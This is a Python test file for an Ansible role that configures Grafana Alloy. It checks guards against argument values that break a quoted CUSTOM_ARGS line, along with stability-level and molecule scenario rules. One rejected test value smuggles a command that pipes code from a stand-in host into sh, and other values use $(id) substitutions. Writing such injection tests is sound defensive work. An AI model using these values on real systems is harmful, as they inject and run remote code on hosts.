"""The alloy_host guards, and the scenario that proves them.

The `alloy_host_extra_args` assert is evaluated here since molecule never
answers a hostile value; the scenario tests pin its one declared junit firing.
"""

from __future__ import annotations

from pathlib import Path

import jinja2
import pytest
import yaml
from _helpers import ansible_env

REPO = Path(__file__).resolve().parent.parent
ROLE = REPO / "ansible_collections" / "weisssrv" / "infra" / "roles" / "alloy_host"
MAIN = ROLE / "tasks" / "main.yml"

QUOTE_ASSERT = "Assert no Alloy extra argument breaks the CUSTOM_ARGS assignment"
CUSTOM_ARGS = "Set Alloy command-line arguments"
CREDS_ASSERT = "Assert Loki push credentials are present"
FIRST_MUTATION = "Add Grafana signed APT repository"

SCENARIO = ROLE / "molecule" / "default"
CONVERGE = SCENARIO / "converge.yml"
VERIFY = SCENARIO / "verify.yml"
DECLARATION = SCENARIO / "expected-junit-failures.txt"
CREDS_VERIFY = "Assert the empty-credentials https run was rejected"
IDEMPOTENCE_SKIP = "molecule-idempotence-notest"

TASKS = [t for t in yaml.safe_load(MAIN.read_text()) if isinstance(t, dict)]
NAMES = [str(t.get("name", "")) for t in TASKS]


def _task(name: str) -> dict:
    matches = [t for t in TASKS if str(t.get("name", "")) == name]
    assert len(matches) == 1, f"expected exactly one task named {name!r} in {MAIN}"
    return matches[0]


def _conditions() -> list[str]:
    return list(_task(QUOTE_ASSERT)["ansible.builtin.assert"]["that"])


def _accepts(arg: str) -> bool:
    """Evaluate the role's real assert condition against one loop item."""
    env = ansible_env(undefined=jinja2.StrictUndefined)
    expression = " and ".join(f"({c})" for c in _conditions())
    return env.from_string("{{ (" + expression + ") | bool }}").render(item=arg) == "True"


def test_the_guard_exists_with_the_exact_conditions() -> None:
    """Pinned literally: these three clauses are the whole guard (no `"`, no
    trailing `\\`, no whitespace), and a looser rewrite (a `| quote`) would still
    read as a quoting check while admitting a value that breaks the assignment."""
    assert _conditions() == [
        "'\"' not in item",
        'not item.endswith("\\\\")',
        'item is not search("\\\\s")',
    ]


def test_the_guard_covers_every_entry_of_the_variable() -> None:
    """A guard that checks one value, or a variable nobody answers, guards
    nothing — the loop over `alloy_host_extra_args` is half the assertion."""
    task = _task(QUOTE_ASSERT)
    assert task["loop"] == "{{ alloy_host_extra_args }}"


def test_the_guard_runs_before_the_line_is_written() -> None:
    """Asserting after the write would leave the broken CUSTOM_ARGS on disk."""
    assert NAMES.index(QUOTE_ASSERT) < NAMES.index(CUSTOM_ARGS)


def test_the_guarded_line_really_is_a_double_quoted_assignment() -> None:
    """The assert is only justified while the args are interpolated into a
    double-quoted assignment. If that line ever stops quoting this way, the
    condition above is pinning a rule that no longer matches the risk."""
    line = _task(CUSTOM_ARGS)["ansible.builtin.lineinfile"]["line"]
    assert line.startswith('CUSTOM_ARGS="') and line.endswith('"')
    assert "alloy_host_extra_args" in line


def test_the_failure_message_names_the_variable_and_the_consequence() -> None:
    fail_msg = _task(QUOTE_ASSERT)["ansible.builtin.assert"]["fail_msg"]
    assert "alloy_host_extra_args" in fail_msg
    assert "CUSTOM_ARGS" in fail_msg


@pytest.mark.parametrize(
    "arg",
    [
        "--server.http.listen-addr=0.0.0.0:12345",
        "--disable-reporting",
        "--storage.path=/var/lib/alloy/data",
        "--cluster.name=weisssrv",
        "",
    ],
)
def test_ordinary_arguments_are_accepted(arg: str) -> None:
    assert _accepts(arg) is True


@pytest.mark.parametrize(
    "arg",
    [
        '--cluster.name="prod"',
        '--x=a" ; curl http://evil.test/x | sh ; echo "',
        'trailing"',
        '"leading',
        "--x=trailing\\",
    ],
)
def test_values_that_break_the_assignment_are_rejected(arg: str) -> None:
    """Values that close the CUSTOM_ARGS assignment early are rejected."""
    assert _accepts(arg) is False


@pytest.mark.parametrize("arg", ["--x=$(id)", "--x=`id`", "--x='q'"])
def test_the_guard_is_scoped_to_the_double_quote_it_names(arg: str) -> None:
    """The guard covers the double quote and trailing backslash only, not shell metacharacters."""
    assert _accepts(arg) is True


def _render_custom_args(wal_enabled: bool, extra_args: list[str]) -> list[str]:
    """Render the role's real CUSTOM_ARGS line and return its argument words."""
    line = _task(CUSTOM_ARGS)["ansible.builtin.lineinfile"]["line"]
    env = ansible_env(undefined=jinja2.StrictUndefined)
    rendered = env.from_string(line).render(
        alloy_host_wal_enabled=wal_enabled, alloy_host_extra_args=extra_args
    )
    assert rendered.startswith('CUSTOM_ARGS="') and rendered.endswith('"')
    return rendered[len('CUSTOM_ARGS="') : -1].split(" ")


def test_the_wal_adds_the_experimental_stability_level_once() -> None:
    """Alloy >= 1.21 refuses the loki.write wal block below experimental."""
    words = _render_custom_args(True, ["--server.http.listen-addr=0.0.0.0:12345"])
    assert words == [
        "--disable-reporting",
        "--stability.level=experimental",
        "--server.http.listen-addr=0.0.0.0:12345",
    ]


def test_no_stability_level_without_the_wal() -> None:
    words = _render_custom_args(False, [])
    assert words == ["--disable-reporting"]
    assert not any(w.startswith("--stability.level") for w in words)


STABILITY_ASSERT = "Assert a site stability level keeps the Alloy WAL loadable"


def _stability_accepts(wal_enabled: bool, extra_args: list[str]) -> bool:
    """Evaluate the role's real stability-level assert."""
    env = ansible_env(undefined=jinja2.StrictUndefined)
    conditions = _task(STABILITY_ASSERT)["ansible.builtin.assert"]["that"]
    expression = " and ".join(f"({c})" for c in conditions)
    rendered = env.from_string("{{ (" + expression + ") | bool }}").render(
        alloy_host_wal_enabled=wal_enabled, alloy_host_extra_args=extra_args
    )
    return rendered == "True"


def test_a_site_experimental_level_is_accepted_and_emitted_once() -> None:
    args = ["--stability.level=experimental"]
    assert _stability_accepts(True, args) is True
    assert _render_custom_args(True, args) == [
        "--disable-reporting",
        "--stability.level=experimental",
    ]


@pytest.mark.parametrize(
    "arg",
    [
        " --stability.level=public-preview",
        "--foo=bar --stability.level=public-preview",
        "--x=a b",
        "--x=a\tb",
        "--x=a\nb",
    ],
)
def test_an_entry_holding_more_than_one_argument_is_rejected(arg: str) -> None:
    """Whitespace splits an entry into words the stability guard never sees."""
    assert _accepts(arg) is False


def test_a_repeated_unrelated_flag_keeps_its_multiplicity() -> None:
    args = ["--cluster.join-addresses=a", "--cluster.join-addresses=a"]
    assert _render_custom_args(True, args) == [
        "--disable-reporting",
        "--stability.level=experimental",
        *args,
    ]
    assert _render_custom_args(False, args) == ["--disable-reporting", *args]


def test_a_site_experimental_level_given_twice_is_written_once() -> None:
    args = ["--stability.level=experimental", "--stability.level=experimental"]
    assert _stability_accepts(True, args) is True
    words = _render_custom_args(True, args)
    assert words.count("--stability.level=experimental") == 1
    assert words == ["--disable-reporting", "--stability.level=experimental"]


@pytest.mark.parametrize(
    "args",
    [
        ["--stability.level=public-preview"],
        ["--stability.level=generally-available"],
        ["--stability.level", "experimental"],
        ["--stability.level=experimental", "--stability.level=public-preview"],
    ],
)
def test_any_other_site_level_fails_while_the_wal_is_on(args: list[str]) -> None:
    """public-preview still rejects the wal block; the assert stops the deploy."""
    assert _stability_accepts(True, args) is False


def test_with_the_wal_off_any_site_level_passes_through() -> None:
    args = ["--stability.level=public-preview"]
    assert _stability_accepts(False, args) is True
    assert _render_custom_args(False, args) == [
        "--disable-reporting",
        "--stability.level=public-preview",
    ]


def test_no_site_level_passes_the_stability_assert() -> None:
    assert _stability_accepts(True, ["--server.http.listen-addr=0.0.0.0:12345"]) is True


def test_the_stability_assert_runs_before_the_line_is_written() -> None:
    assert NAMES.index(STABILITY_ASSERT) < NAMES.index(CUSTOM_ARGS)


def _negative_path_block() -> dict:
    """The converge post_task that drives the credentials guard to failure."""
    play = yaml.safe_load(CONVERGE.read_text())[0]
    blocks = [t for t in play["post_tasks"] if isinstance(t, dict) and "block" in t]
    assert len(blocks) == 1, f"expected exactly one block/rescue in {CONVERGE}"
    return blocks[0]


def _verify_task(name: str) -> dict:
    tasks = yaml.safe_load(VERIFY.read_text())[0]["tasks"]
    matches = [t for t in tasks if str(t.get("name", "")) == name]
    assert len(matches) == 1, f"expected exactly one task named {name!r} in {VERIFY}"
    return matches[0]


def _declared_lines() -> list[str]:
    return [
        line.strip()
        for line in DECLARATION.read_text().splitlines()
        if line.strip() and not line.strip().startswith("#")
    ]


def test_the_negative_case_is_skipped_on_the_idempotence_run() -> None:
    """Molecule's idempotence step re-runs converge, so an untagged negative
    block fires the guard twice per job and records two junit failures where
    the declaration below allows one — a green molecule run, a red job."""
    assert IDEMPOTENCE_SKIP in _negative_path_block().get("tags", [])


def test_the_declaration_allows_exactly_one_firing() -> None:
    """The tag above is what makes a single declared occurrence true; a ` ::n`
    count here would instead pin the test sequence into the declaration."""
    assert _declared_lines() == [CREDS_ASSERT]


def test_the_credentials_guard_runs_before_anything_mutates() -> None:
    """The scenario re-includes the role in converge post_tasks; only a guard
    ahead of every mutating task leaves the converged host untouched."""
    assert NAMES.index(CREDS_ASSERT) < NAMES.index(FIRST_MUTATION)


def test_the_negative_case_pins_the_guard_that_rejected_the_run() -> None:
    """A rescued `failed: true` is also true when the re-run dies of an apt
    error, so verify matches the guard's own message — which keeps the role's
    fail_msg and the scenario's expectation coupled."""
    conditions = " ".join(_verify_task(CREDS_VERIFY)["ansible.builtin.assert"]["that"])
    fail_msg = _task(CREDS_ASSERT)["ansible.builtin.assert"]["fail_msg"]
    for variable in ("alloy_host_loki_user", "alloy_host_loki_password"):
        assert variable in conditions
        assert variable in fail_msg
